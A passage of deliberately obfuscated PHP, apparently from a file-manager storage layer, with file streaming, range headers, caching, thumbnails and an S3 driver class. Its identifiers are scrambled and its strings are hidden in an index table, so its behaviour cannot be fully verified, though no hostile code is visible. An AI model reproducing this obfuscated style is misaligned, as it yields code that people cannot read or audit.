$¸¢Çç¯‚ = false, $ü”‹Ûçı = '') { $¡ôíÈ×Ü =& $_SERVER[¹ş¤¶ĞÖ]; $this->cacheMethod(null, null); if (!$²²è·“ç || !$this->exist($²²è·“ç)) { show_json(LNG($¡ôíÈ×Ü[105]), !1, $¸¢Çç¯‚); } $ˆÍßúËñ = $this->getType() == $¡ôíÈ×Ü[106]; $Ã‡Â—— = $GLOBALS[$¡ôíÈ×Ü[6]][$¡ôíÈ×Ü[89]][$¡ôíÈ×Ü[107]][$¡ôíÈ×Ü[108]]; $û¦™Íı· = (double) $GLOBALS[$¡ôíÈ×Ü[6]][$¡ôíÈ×Ü[89]][$¡ôíÈ×Ü[107]][$¡ôíÈ×Ü[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ñë–á‚ö = $this->infoFull($²²è·“ç); $¶˜­¿â¢ = $Ñë–á‚ö[$¡ôíÈ×Ü[76]]; $¾’¨Şû = gmdate($¡ôíÈ×Ü[110], $Ñë–á‚ö[$¡ôíÈ×Ü[85]]); $Ú™¤¯¼ˆ = $¸¢Çç¯‚ ? $¸¢Çç¯‚ : $this->iconvApp($Ñë–á‚ö[$¡ôíÈ×Ü[32]]); $Õ¥úÏí = 0; $“ÊºşÕ = $¶˜­¿â¢ - 1; $ºßºşÜ = $this->ext($Ú™¤¯¼ˆ); if (in_array($ºßºşÜ, array($¡ôíÈ×Ü[111], $¡ôíÈ×Ü[112], $¡ôíÈ×Ü[113], $¡ôíÈ×Ü[114]))) { $ºßºşÜ = $¡ôíÈ×Ü[115]; } if (in_array($ºßºşÜ, array($¡ôíÈ×Ü[116]))) { $ºßºşÜ = $¡ôíÈ×Ü[117]; } if (!$ü”‹Ûçı) { $ü”‹Ûçı = md5($¾’¨Şû . $this->hashSimple($²²è·“ç)); } $ü”‹Ûçı = $¡ôíÈ×Ü[118] . $ü”‹Ûçı . $¡ôíÈ×Ü[118]; $’¹¾ûŞ = get_file_mime($ºßºşÜ); $—Šòí¦í = !0; $—Šòí¦í = isset($_GET[$¡ôíÈ×Ü[119]]) ? !1 : !0; if ($ìÌıî™ === !1 && !mime_support($’¹¾ûŞ)) { $’¹¾ûŞ = $¡ôíÈ×Ü[120]; } header($¡ôíÈ×Ü[121]); header($¡ôíÈ×Ü[122] . $’¹¾ûŞ); $¥¡äÊ¦ = rawurlencode($Ú™¤¯¼ˆ); $¥¡äÊ¦ = $¡ôíÈ×Ü[118] . $¥¡äÊ¦ . $¡ôíÈ×Ü[123] . $¥¡äÊ¦; if ($ìÌıî™) { header($¡ôíÈ×Ü[124]); header($¡ôíÈ×Ü[125] . $¥¡äÊ¦); } else { if ($—Šòí¦í) { header($¡ôíÈ×Ü[126] . $¥¡äÊ¦); } } header($¡ôíÈ×Ü[127] . gmdate($¡ôíÈ×Ü[110], time() + 3600 * 24 * 30) . $¡ôíÈ×Ü[128]); header($¡ôíÈ×Ü[129]); header($¡ôíÈ×Ü[130]); header($¡ôíÈ×Ü[131]); if (isset($_SERVER[$¡ôíÈ×Ü[132]]) && strtotime($_SERVER[$¡ôíÈ×Ü[132]]) == $Ñë–á‚ö[$¡ôíÈ×Ü[85]]) { header($¡ôíÈ×Ü[133], !0, 304); die; } if (isset($_SERVER[$¡ôíÈ×Ü[134]]) && $_SERVER[$¡ôíÈ×Ü[134]] == $ü”‹Ûçı) { header($¡ôíÈ×Ü[135] . $ü”‹Ûçı, !0, 304); die; } header($¡ôíÈ×Ü[135] . $ü”‹Ûçı); header($¡ôíÈ×Ü[136] . $¾’¨Şû . $¡ôíÈ×Ü[128]); header($¡ôíÈ×Ü[137] . $Ú™¤¯¼ˆ); header($¡ôíÈ×Ü[138]); header($¡ôíÈ×Ü[139] . $¶˜­¿â¢); header($¡ôíÈ×Ü[140]); if (!$ìÌıî™ && $ºßºşÜ == $¡ôíÈ×Ü[141]) { if ($¶˜­¿â¢ > 1024 * 1024 * 5) { die; } $ÙÉó‰Æ = $this->getContent($²²è·“ç); $ÙÉó‰Æ = Html::clearSVG($ÙÉó‰Æ); header($¡ôíÈ×Ü[142] . strlen($ÙÉó‰Æ)); echo $ÙÉó‰Æ; die; } $Ò‚Ş­—ä = strtolower($_SERVER[$¡ôíÈ×Ü[143]]); if ($ˆÍßúËñ && $Ò‚Ş­—ä && $Ã‡Â——) { if (strstr($Ò‚Ş­—ä, $¡ôíÈ×Ü[144])) { header($¡ôíÈ×Ü[145] . $²²è·“ç); } else { if (strstr($Ò‚Ş­—ä, $¡ôíÈ×Ü[146])) { header($¡ôíÈ×Ü[147] . $²²è·“ç); } else { if (strstr($Ò‚Ş­—ä, $¡ôíÈ×Ü[148])) { header($¡ôíÈ×Ü[149] . $²²è·“ç); } } } if ($û¦™Íı·) { header($¡ôíÈ×Ü[150] . $û¦™Íı·); } return; } if (isset($_SERVER[$¡ôíÈ×Ü[151]])) { if (preg_match($¡ôíÈ×Ü[152], $_SERVER[$¡ôíÈ×Ü[151]], $¤ÆÕû­)) { $Õ¥úÏí = intval($¤ÆÕû­[1]); $Õ¥úÏí = $Õ¥úÏí <= 0 ? 0 : ($Õ¥úÏí >= $“ÊºşÕ ? $“ÊºşÕ : $Õ¥úÏí); if (!empty($¤ÆÕû­[2])) { $ ŒÁ• = intval($¤ÆÕû­[2]); $“ÊºşÕ = $ ŒÁ• < $Õ¥úÏí ? $Õ¥úÏí : ($ ŒÁ• >= $“ÊºşÕ ? $“ÊºşÕ : $ ŒÁ•); } } header($¡ôíÈ×Ü[153]); header("\103\157\156\164\x65\156\164\55\122\141\x6e\147\145\72\x20\142\x79\x74\145\x73\x20{$Õ¥úÏí}\55{$“ÊºşÕ}\x2f" . $¶˜­¿â¢); } else { header($¡ôíÈ×Ü[154]); } header($¡ôíÈ×Ü[155]); $€¥Åë™ = !0; if ($_SERVER[$¡ôíÈ×Ü[156]] == $¡ôíÈ×Ü[157] && $¶˜­¿â¢ > 1204 * 1024 * 1024 * 2) { $€¥Åë™ = !1; } if ($€¥Åë™) { header($¡ôíÈ×Ü[158] . ($“ÊºşÕ - $Õ¥úÏí + 1)); } if ($_SERVER[$¡ôíÈ×Ü[159]] == $¡ôíÈ×Ü[160]) { return; } $­©éº = 1024 * 100; $á¤ä×š = 0; if ($û¦™Íı·) { $á¤ä×š = intval(1000 * 1000 * ($­©éº / $û¦™Íı·)); } while ($Õ¥úÏí <= $“ÊºşÕ) { $ˆöğ¥¢ = timeFloat(); check_abort(); $«÷õå†– = $“ÊºşÕ - $Õ¥úÏí + 1; if ($«÷õå†– <= $­©éº) { $­©éº = $«÷õå†–; } echo $this->fileSubstr($²²è·“ç, $Õ¥úÏí, $­©éº); $Õ¥úÏí += $­©éº; if ($­©éº == $«÷õå†–) { $Õ¥úÏí = $“ÊºşÕ + 1; } if ($á¤ä×š) { $·ŠìáØš = intval(1000 * 1000 * (timeFloat() - $ˆöğ¥¢)); $¯øéÇÂæ = $á¤ä×š - $·ŠìáØš; if ($¯øéÇÂæ > 5) { usleep($¯øéÇÂæ); } } } } public function fileOutServer($¾ĞÍ–£Â, $ôôßƒÀÛ = false, $ö€İÖ€¼ = false, $Ñ¼®…ü = '') { $this->fileOut($¾ĞÍ–£Â, $ôôßƒÀÛ, $ö€İÖ€¼, $Ñ¼®…ü); } public function fileOutLink($Ÿ—äë¶Ÿ) { header($_SERVER[¹ş¤¶ĞÖ][161] . $Ÿ—äë¶Ÿ); die; } public function cacheMethod($åó…Ëó½, $‘•Ê¤´¾, $†’•›şœ = null) { $‘°Á˜ƒ =& $_SERVER[¹ş¤¶ĞÖ]; static $©æ™Ô«ç = array(); $¼ıƒôŠÖ = $‘•Ê¤´¾ ? ltrim($this->getPathOuter($‘•Ê¤´¾), $‘°Á˜ƒ[8]) : $‘°Á˜ƒ[12]; $„ÊÜÁ¢Ä = $‘°Á˜ƒ[162] . $åó…Ëó½ . $‘°Á˜ƒ[163] . rtrim($¼ıƒôŠÖ, $‘°Á˜ƒ[8]); if (is_null($åó…Ëó½)) { $©æ™Ô«ç = array(); return; } if (is_null($‘•Ê¤´¾)) { foreach ($©æ™Ô«ç as $„ÊÜÁ¢Ä => $ó•Î‚¶) { if (!strstr($„ÊÜÁ¢Ä, $‘°Á˜ƒ[162] . $åó…Ëó½ . $‘°Á˜ƒ[164])) { continue; } unset($©æ™Ô«ç[$„ÊÜÁ¢Ä]); } return; } if (!is_null($†’•›şœ)) { $©æ™Ô«ç[$„ÊÜÁ¢Ä] = $†’•›şœ; return; } $ıÀ×ƒ = isset($©æ™Ô«ç[$„ÊÜÁ¢Ä]) ? $©æ™Ô«ç[$„ÊÜÁ¢Ä] : null; if (!is_null($ıÀ×ƒ)) { return $ıÀ×ƒ; } $ıÀ×ƒ = $this->{$åó…Ëó½}($‘•Ê¤´¾); $©æ™Ô«ç[$„ÊÜÁ¢Ä] = $ıÀ×ƒ; return $ıÀ×ƒ; } public function cacheMethodInfoSet($¯²Şõ£, $éñŠŸ·‡, $Ÿ¬˜¿¥Ÿ = false) { $ŠÜÖò‘ =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ŠÜÖò‘[165], $¯²Şõ£, $éñŠŸ·‡); $this->cacheMethod($ŠÜÖò‘[166], $¯²Şõ£, $éñŠŸ·‡ ? !1 : !0); if (is_array($Ÿ¬˜¿¥Ÿ)) { $this->cacheMethod($ŠÜÖò‘[167], $¯²Şõ£, $Ÿ¬˜¿¥Ÿ); } } public function fileOutImage($Ğ»‹€´µ, $ş¡±¯è = 250) { $œ©¢—Êï =& $_SERVER[¹ş¤¶ĞÖ]; set_timeout(); if (substr($Ğ»‹€´µ, 0, 4) == $œ©¢—Êï[148]) { $this->fileOutLink($Ğ»‹€´µ); } $Ù•ÅÑÖÎ = $this->info($Ğ»‹€´µ); $ªãïÒ­Ï = $Ù•ÅÑÖÎ[$œ©¢—Êï[32]]; $ŸÁ‚§ô¦ = !1; if (isset($GLOBALS[$œ©¢—Êï[168]]) && $GLOBALS[$œ©¢—Êï[168]][$œ©¢—Êï[84]] == $Ù•ÅÑÖÎ[$œ©¢—Êï[84]]) { $˜‘‰™’ = $GLOBALS[$œ©¢—Êï[168]][$œ©¢—Êï[169]]; if (!$Ù•ÅÑÖÎ[$œ©¢—Êï[170]]) { $Ù•ÅÑÖÎ[$œ©¢—Êï[170]] = $GLOBALS[$œ©¢—Êï[168]]; } if (isset($˜‘‰™’[$œ©¢—Êï[171]])) { if ($˜‘‰™’[$œ©¢—Êï[171]] <= $ş¡±¯è && $˜‘‰™’[$œ©¢—Êï[172]] <= $ş¡±¯è) { $ŸÁ‚§ô¦ = !0; } } $ªãïÒ­Ï = $Ù•ÅÑÖÎ[$œ©¢—Êï[170]][$œ©¢—Êï[32]]; } if ($Ù•ÅÑÖÎ[$œ©¢—Êï[76]] <= 1024 * 50 || $ŸÁ‚§ô¦ || !function_exists($œ©¢—Êï[173]) || $Ù•ÅÑÖÎ[$œ©¢—Êï[174]] == $œ©¢—Êï[175]) { return $this->fileOut($Ğ»‹€´µ, !1, $ªãïÒ­Ï); } if (isset($Ù•ÅÑÖÎ[$œ©¢—Êï[170]][$œ©¢—Êï[176]])) { $Áü×æ½‹ = $Ù•ÅÑÖÎ[$œ©¢—Êï[170]][$œ©¢—Êï[176]]; } else { if (isset($Ù•ÅÑÖÎ[$œ©¢—Êï[170]][$œ©¢—Êï[177]])) { $Áü×æ½‹ = $Ù•ÅÑÖÎ[$œ©¢—Êï[170]][$œ©¢—Êï[177]]; } } if (!$Áü×æ½‹) { $Áü×æ½‹ = md5("{$Ù•ÅÑÖÎ[$œ©¢—Êï[32]]}\137{$Ù•ÅÑÖÎ[$œ©¢—Êï[84]]}\137{$Ù•ÅÑÖÎ[$œ©¢—Êï[76]]}\137{$ş¡±¯è}"); } $íİıÒ”— = "{$Áü×æ½‹}\137{$ş¡±¯è}\56\160\x6e\x67"; if (!($Ùµ²¦ÏŒ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $œ©¢—Êï[178]))) { $Óİµ«À = IO::mkdir(IO_PATH_SYSTEM_TEMP . $œ©¢—Êï[179]); } else { $Óİµ«À = KodIO::make($Ùµ²¦ÏŒ); } if ($Ùµ²¦ÏŒ = IO::fileNameExist($Óİµ«À, $íİıÒ”—)) { $ûÌ»”Êò = KodIO::make($Ùµ²¦ÏŒ); return IO::fileOut($ûÌ»”Êò, !1, $ªãïÒ­Ï); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ûÌ»”Êò = DATA_THUMB . $íİıÒ”—; del_file($ûÌ»”Êò); if (!@file_exists($ûÌ»”Êò)) { $÷ÉŠ©• = TEMP_FILES; if (!is_dir($÷ÉŠ©•)) { mk_dir($÷ÉŠ©•); } $¾éîí–ó = $÷ÉŠ©• . $Áü×æ½‹ . $œ©¢—Êï[10] . $Ù•ÅÑÖÎ[$œ©¢—Êï[174]]; if (!@file_exists($¾éîí–ó)) { $¾éîí–ó = $this->download($Ğ»‹€´µ, $¾éîí–ó); } ImageThumb::createThumb($¾éîí–ó, $ûÌ»”Êò, $ş¡±¯è, $ş¡±¯è * 10); } if (!file_exists($ûÌ»”Êò) || filesize($ûÌ»”Êò) < 100) { return @file_exists($¾éîí–ó) ? IO::fileOut($¾éîí–ó) : $this->fileOut($Ğ»‹€´µ); } if (!($şœöÍæé = IO::move($ûÌ»”Êò, $Óİµ«À))) { return IO::fileOut($ûÌ»”Êò); } del_file($ûÌ»”Êò); IO::fileOut($şœöÍæé); } public function fileOutImageServer($†ˆ®™—, $õ¡ØËÔü = 250) { $this->fileOutImage($†ˆ®™—, $õ¡ØËÔü); } public function fileNameAuto($Á½“³ÂÈ, $Ü±õŠÙ, $¯­¥Ùµõ = REPEAT_RENAME, $˜œ½û–” = false) { $ê±óåƒ =& $_SERVER[¹ş¤¶ĞÖ]; $Äß…Œ» = $Á½“³ÂÈ === $ê±óåƒ[12] ? $Ü±õŠÙ : rtrim($Á½“³ÂÈ, $ê±óåƒ[8]) . $ê±óåƒ[8] . $Ü±õŠÙ; if ($¯­¥Ùµõ == REPEAT_REPLACE || !$this->exist($Äß…Œ») || $˜œ½û–” && $¯­¥Ùµõ != REPEAT_RENAME_FOLDER) { return $Ü±õŠÙ; } if ($¯­¥Ùµõ == REPEAT_SKIP) { return !1; } $¹Åµï = $ê±óåƒ[10] . get_path_ext($Ü±õŠÙ); $¹Åµï = $¹Åµï == $ê±óåƒ[10] || $˜œ½û–” ? $ê±óåƒ[12] : $¹Åµï; $®‚Õ¢£Ô = 1; $´Ûƒğ¥Ä = substr($Ü±õŠÙ, 0, strlen($Ü±õŠÙ) - strlen($¹Åµï)); $Ãî €¾Õ = $´Ûƒğ¥Ä . "\50{$®‚Õ¢£Ô}\x29{$¹Åµï}"; while ($this->exist(rtrim($Á½“³ÂÈ, $ê±óåƒ[8]) . $ê±óåƒ[8] . $Ãî €¾Õ)) { $Ãî €¾Õ = $´Ûƒğ¥Ä . "\50{$®‚Õ¢£Ô}\x29{$¹Åµï}"; $®‚Õ¢£Ô++; } return $Ãî €¾Õ; } private function fileNameAutoList($€ åÓå£, $ã¬ÑïÑê, $À‚¿Ü‚ï = false) { $¸²ú©® =& $_SERVER[¹ş¤¶ĞÖ]; $‡ÍòÕá… = $this->listPath($€ åÓå£, !0); $‡ÍòÕá… = array_merge($‡ÍòÕá…[$¸²ú©®[82]], $‡ÍòÕá…[$¸²ú©®[83]]); $çÓ–˜Á = array_to_keyvalue($‡ÍòÕá…, $¸²ú©®[12], $¸²ú©®[32]); $½¿òĞ› = $¸²ú©®[10] . get_path_ext($ã¬ÑïÑê); $½¿òĞ› = $½¿òĞ› == $¸²ú©®[10] || $À‚¿Ü‚ï ? $¸²ú©®[12] : $½¿òĞ›; $ìÏæ¨¼¥ = substr($ã¬ÑïÑê, 0, strlen($ã¬ÑïÑê) - strlen($½¿òĞ›)); $Î³•›Š = $ìÏæ¨¼¥ . "\50\x30\51{$½¿òĞ›}"; for ($Œõ·Ö½¿ = 1; $Œõ·Ö½¿ <= count($çÓ–˜Á) + 1; $Œõ·Ö½¿++) { $Î³•›Š = $ìÏæ¨¼¥ . "\x28{$Œõ·Ö½¿}\x29{$½¿òĞ›}"; if (!in_array_not_case($Î³•›Š, $çÓ–˜Á)) { return $Î³•›Š; } } return $Î³•›Š; } public function listAllFiles($ËŸìÒÇÂ, $³Ù³ãôÒ) { $Şôù¦¹î =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($³Ù³ãôÒ)) { return array(); } $ó‰×›¹Ÿ = array_keys($³Ù³ãôÒ); $âìµ†Ğë = array(); $ËŸìÒÇÂ = trim($ËŸìÒÇÂ, $Şôù¦¹î[8]); foreach ($³Ù³ãôÒ as $ÎÆüúĞÔ => $ÓÈ£øøı) { $óñ÷¡Ç = ltrim(substr(trim($ÎÆüúĞÔ, $Şôù¦¹î[8]), strlen($ËŸìÒÇÂ)), $Şôù¦¹î[8]); if (substr($ÎÆüúĞÔ, -1) == $Şôù¦¹î[8]) { $óñ÷¡Ç = rtrim($óñ÷¡Ç, $Şôù¦¹î[8]) . $Şôù¦¹î[8]; } $âìµ†Ğë = array_merge($âìµ†Ğë, $this->slicePath($óñ÷¡Ç)); } $¢ĞşÔæÄ = array(); foreach (array_unique($âìµ†Ğë) as $¦ó†Æö) { $üèóãÊî = array($Şôù¦¹î[84] => $this->getPathOuter($Şôù¦¹î[8] . $ËŸìÒÇÂ . $Şôù¦¹î[8] . $¦ó†Æö), $Şôù¦¹î[75] => 1, $Şôù¦¹î[76] => 0); if (substr($¦ó†Æö, -1) != $Şôù¦¹î[8]) { $üèóãÊî[$Şôù¦¹î[75]] = 0; $ÎÒÅ×ê‘ = $this->getPath($ËŸìÒÇÂ . $Şôù¦¹î[8] . $¦ó†Æö); if (isset($³Ù³ãôÒ[$ÎÒÅ×ê‘])) { $­¡¿¯‘ƒ = $³Ù³ãôÒ[$ÎÒÅ×ê‘]; if (isset($­¡¿¯‘ƒ[$Şôù¦¹î[76]])) { $üèóãÊî[$Şôù¦¹î[76]] = intval($­¡¿¯‘ƒ[$Şôù¦¹î[76]]); } if (isset($­¡¿¯‘ƒ[$Şôù¦¹î[180]])) { $üèóãÊî[$Şôù¦¹î[85]] = intval($­¡¿¯‘ƒ[$Şôù¦¹î[180]]); } } } $¢ĞşÔæÄ[] = $üèóãÊî; } return $¢ĞşÔæÄ; } public function slicePath($µ »†‚¾) { $°ûïÔêÜ =& $_SERVER[¹ş¤¶ĞÖ]; $Êü•æáÃ = explode($°ûïÔêÜ[8], trim($µ »†‚¾, $°ûïÔêÜ[8])); $½ÀÉ­… = 0; do { ++$½ÀÉ­…; $ÉÇÕû‘[] = implode($°ûïÔêÜ[8], array_slice($Êü•æáÃ, 0, $½ÀÉ­…)) . $°ûïÔêÜ[8]; } while ($½ÀÉ­… < count($Êü•æáÃ)); $ÉÇÕû‘[count($Êü•æáÃ) - 1] = $µ »†‚¾; return $ÉÇÕû‘; } public function getHost() { $ßÕİƒıœ =& $_SERVER[¹ş¤¶ĞÖ]; $›œéÛıÑ = parse_url(trim($this->domain, $ßÕİƒıœ[8])); $èş„ŞÏ€ = isset($›œéÛıÑ[$ßÕİƒıœ[181]]) ? $›œéÛıÑ[$ßÕİƒıœ[181]] : http_type(); $ÚÓÈÚÌ = isset($›œéÛıÑ[$ßÕİƒıœ[182]]) ? $›œéÛıÑ[$ßÕİƒıœ[182]] : $›œéÛıÑ[$ßÕİƒıœ[84]]; if (isset($›œéÛıÑ[$ßÕİƒıœ[183]])) { $ÚÓÈÚÌ .= $ßÕİƒıœ[4] . $›œéÛıÑ[$ßÕİƒıœ[183]]; } return $èş„ŞÏ€ . $ßÕİƒıœ[184] . $ÚÓÈÚÌ; } public function pathEncode($™«ã®Äï) { $šı­ßÎ =& $_SERVER[¹ş¤¶ĞÖ]; return str_replace($šı­ßÎ[185], $šı­ßÎ[8], rawurlencode($™«ã®Äï)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‚ ”¹û) { set_timeout(); require_once SDK_DIR . $_SERVER[¹ş¤¶ĞÖ][186]; parent::__construct(); $this->_init($‚ ”¹û); } public function _init($Ù“­ÕÅï) { $this->config = $Ù“­ÕÅï; foreach ($Ù“­ÕÅï as $ÈÒüÁÓë => $ˆ¹™ş·Ö) { if (isset($this->{$ÈÒüÁÓë})) { $this->{$ÈÒüÁÓë} = $ˆ¹™ş·Ö; } } $this->endpoint = $Ù“­ÕÅï[$_SERVER[¹ş¤¶ĞÖ][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($æŠÖåâ© = "\166\x34") { $this->signVer = $æŠÖåâ©; $this->client->setSignatureVersion($æŠÖåâ©); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Ì—Ã×ÓÕ =& $_SERVER[¹ş¤¶ĞÖ]; $—¥Ûï¤Ô = $this->getBucketCors(); if (!$—¥Ûï¤Ô || !is_array($—¥Ûï¤Ô)) { return !1; } if ($—¥Ûï¤Ô[$Ì—Ã×ÓÕ[188]] != $Ì—Ã×ÓÕ[189] || $—¥Ûï¤Ô[$Ì—Ã×ÓÕ[190]] != $Ì—Ã×ÓÕ[189]) { return !1; } $œ®Ñ³ÒÄ = array_map($Ì—Ã×ÓÕ[191], $—¥Ûï¤Ô[$Ì—Ã×ÓÕ[192]]); if (!is_array($œ®Ñ³ÒÄ)) { $œ®Ñ³ÒÄ = array(); } $€ÑÛÚ´ = array($Ì—Ã×ÓÕ[193], $Ì—Ã×ÓÕ[194], $Ì—Ã×ÓÕ[195], $Ì—Ã×ÓÕ[196], $Ì—Ã×ÓÕ[197]); $Ê³Ö£¤´ = array_diff($€ÑÛÚ´, $œ®Ñ³ÒÄ); return empty($Ê³Ö£¤´); } public function mkfile($Ğ¦’à¦í, $ñŒæÔÆÆ = '', $ÇÖçÌòÖ = REPEAT_RENAME) { $èÕğ‚ = $this->setContent($Ğ¦’à¦í, $ñŒæÔÆÆ); if ($èÕğ‚ !== !1) { return $this->getPathOuter($Ğ¦’à¦í); } return !1; } public function mkdir($Çƒ¡Ïï, $‚ğ¼Şüü = REPEAT_SKIP) { $ç›ïƒß‹ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($Çƒ¡Ïï) && $Çƒ¡Ïï !== $ç›ïƒß‹[198]) { return !1; } if ($‚ğ¼Şüü && $this->_isFolder($Çƒ¡Ïï)) { return $this->getPathOuter($Çƒ¡Ïï); } $ÅŠåÍ´¿ = $this->setContent($Çƒ¡Ïï, $ç›ïƒß‹[12], !0); if ($ÅŠåÍ´¿ !== !1) { return $this->getPathOuter($Çƒ¡Ïï); } return !1; } public function copyFile($¢‰ÏÄ‰, $˜Ï¨·ƒ”, $¢ßœğ— = array()) { $µ šç =& $_SERVER[¹ş¤¶ĞÖ]; $¬¢ûÅ = $this->objectMeta($¢‰ÏÄ‰); if (!$¬¢ûÅ) { return !1; } if ($¬¢ûÅ[$µ šç[76]] <= 1024 * 1024 * 200) { $Ì•µÛÛı = $this->client->copyObject($this->bucket, $¢‰ÏÄ‰, $this->bucket, $˜Ï¨·ƒ”, $µ šç[199], $¢ßœğ—); } else { $Ì•µÛÛı = $this->client->multiCopyObject($this->bucket, $¢‰ÏÄ‰, $this->bucket, $˜Ï¨·ƒ”, $¢ßœğ—); } $Ì•µÛÛı = $Ì•µÛÛı ? $this->getPathOuter($˜Ï¨·ƒ”) : !1; return $Ì•µÛÛı; } public function moveFile($à´¹é‰Ì, $éÓÊ—ôå) { if ($this->copyFile($à´¹é‰Ì, $éÓÊ—ôå)) { $this->delFile($à´¹é‰Ì); return $this->getPathOuter($éÓÊ—ôå); } return !1; } public function delFile($€¬ú«“ç) { return $this->client->deleteObject($this->bucket, $€¬ú«“ç); } public function delFolder($ç±¢Áæ¬) { $’ºìÌ¶¯ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->exist($ç±¢Áæ¬)) { return !0; } $this->listItemCache = !1; $²ÓÃ®¬ = $this->fileList($ç±¢Áæ¬); $this->listItemCache = !0; $¯Ï•¡š = trim($ç±¢Áæ¬, $’ºìÌ¶¯[8]) . $’ºìÌ¶¯[8]; if (!empty($ç±¢Áæ¬) && $ç±¢Áæ¬ !== $’ºìÌ¶¯[198] && !in_array($¯Ï•¡š, $²ÓÃ®¬[$’ºìÌ¶¯[82]])) { $²ÓÃ®¬[$’ºìÌ¶¯[82]][] = $¯Ï•¡š; } $ŞåÍ®ôà = $this->delByBatch($²ÓÃ®¬[$’ºìÌ¶¯[83]]); if (!$ŞåÍ®ôà) { return !1; } $ŞåÍ®ôà = $this->delByBatch($²ÓÃ®¬[$’ºìÌ¶¯[82]]); if (!$ŞåÍ®ôà) { return !1; } return $this->delFile($¯Ï•¡š); } private function delByBatch($°€‚) { foreach (array_chunk($°€‚, 1000) as $äµÖì») { $œù†áÔ = $this->client->deleteObjects($this->bucket, $äµÖì»); if (!$œù†áÔ) { return !1; } } return !0; } public function rename($îæßæ˜ê, $™Å¯ŒÈş) { return $this->renameObject($îæßæ˜ê, $™Å¯ŒÈş); } public function listPath($âöÚ¥—, $Ó«ÆÔÓ‘ = false) { $ë–Ÿª…Ï =& $_SERVER[¹ş¤¶ĞÖ]; $ˆºòÒËŠ = $this->fileList($âöÚ¥—, $ë–Ÿª…Ï[8], !0); foreach ($ˆºòÒËŠ[$ë–Ÿª…Ï[82]] as $öœÓàšÖ => $åéÕ¾ÓŠ) { $ˆºòÒËŠ[$ë–Ÿª…Ï[82]][$öœÓàšÖ] = $this->folderInfo($åéÕ¾ÓŠ, $Ó«ÆÔÓ‘, $åéÕ¾ÓŠ); } foreach ($ˆºòÒËŠ[$ë–Ÿª…Ï[83]] as $öœÓàšÖ => $åéÕ¾ÓŠ) { $ˆºòÒËŠ[$ë–Ÿª…Ï[83]][$öœÓàšÖ] = $this->fileInfo($åéÕ¾ÓŠ[$ë–Ÿª…Ï[32]], $Ó«ÆÔÓ‘, $åéÕ¾ÓŠ); } return $ˆºòÒËŠ; } protected function infoChildren($—Ì±ƒ„², &$šĞïë) { $°‰¡Ï‚ä =& $_SERVER[¹ş¤¶ĞÖ]; $¥ˆçäé• = $this->fileList($—Ì±ƒ„², $°‰¡Ï‚ä[12], !0); $šĞïë[$°‰¡Ï‚ä[78]] += count($¥ˆçäé•[$°‰¡Ï‚ä[82]]); $šĞïë[$°‰¡Ï‚ä[77]] += count($¥ˆçäé•[$°‰¡Ï‚ä[83]]); foreach ($¥ˆçäé•[$°‰¡Ï‚ä[83]] as $‹µÒĞ¾¦) { if (!$‹µÒĞ¾¦ || !$‹µÒĞ¾¦[$°‰¡Ï‚ä[76]]) { continue; } $šĞïë[$°‰¡Ï‚ä[76]] += $‹µÒĞ¾¦[$°‰¡Ï‚ä[76]]; } } private function fileInfo($„¼¬à, $¢“ éí = false, $áûÓçÊõ = array()) { $Ôà¿À’ =& $_SERVER[¹ş¤¶ĞÖ]; $œ£†‘½¡ = array($Ôà¿À’[32] => $this->pathThis($„¼¬à), $Ôà¿À’[84] => $this->getPathOuter($„¼¬à), $Ôà¿À’[33] => $Ôà¿À’[200], $Ôà¿À’[174] => $this->ext($„¼¬à), $Ôà¿À’[76] => isset($áûÓçÊõ[$Ôà¿À’[76]]) ? $áûÓçÊõ[$Ôà¿À’[76]] : 0); if ($¢“ éí) { return $œ£†‘½¡; } $œ£†‘½¡[$Ôà¿À’[201]] = $œ£†‘½¡[$Ôà¿À’[85]] = 0; $œ£†‘½¡[$Ôà¿À’[202]] = $œ£†‘½¡[$Ôà¿À’[203]] = !0; if (empty($áûÓçÊõ)) { $áûÓçÊõ = $this->objectMeta($„¼¬à); if (!$áûÓçÊõ) { return $œ£†‘½¡; } } if (isset($áûÓçÊõ[$Ôà¿À’[180]])) { $œ£†‘½¡[$Ôà¿À’[85]] = $áûÓçÊõ[$Ôà¿À’[180]]; } if (isset($áûÓçÊõ[$Ôà¿À’[76]])) { $œ£†‘½¡[$Ôà¿À’[76]] = $áûÓçÊõ[$Ôà¿À’[76]]; } return $œ£†‘½¡; } private function folderInfo($‹‰ä¿õ‰, $ªÁ¥‚ñÉ = false, $úÓ¤Àå˜ = array()) { $—ŠÎÃöÁ =& $_SERVER[¹ş¤¶ĞÖ]; $Åâ‘‚ªó = array($—ŠÎÃöÁ[32] => $this->pathThis($‹‰ä¿õ‰), $—ŠÎÃöÁ[84] => $this->getPathOuter($—ŠÎÃöÁ[8] . $‹‰ä¿õ‰), $—ŠÎÃöÁ[33] => $—ŠÎÃöÁ[75]); if ($ªÁ¥‚ñÉ) { return $Åâ‘‚ªó; } $Åâ‘‚ªó[$—ŠÎÃöÁ[201]] = $Åâ‘‚ªó[$—ŠÎÃöÁ[85]] = 0; $Åâ‘‚ªó[$—ŠÎÃöÁ[202]] = $Åâ‘‚ªó[$—ŠÎÃöÁ[203]] = !0; if ($‹‰ä¿õ‰ == $—ŠÎÃöÁ[12]) { return $Åâ‘‚ªó; } if (empty($úÓ¤Àå˜)) { $úÓ¤Àå˜ = $this->objectMeta(trim($‹‰ä¿õ‰, $—ŠÎÃöÁ[8]) . $—ŠÎÃöÁ[8]); } if (isset($úÓ¤Àå˜[$—ŠÎÃöÁ[180]])) { $Åâ‘‚ªó[$—ŠÎÃöÁ[201]] = 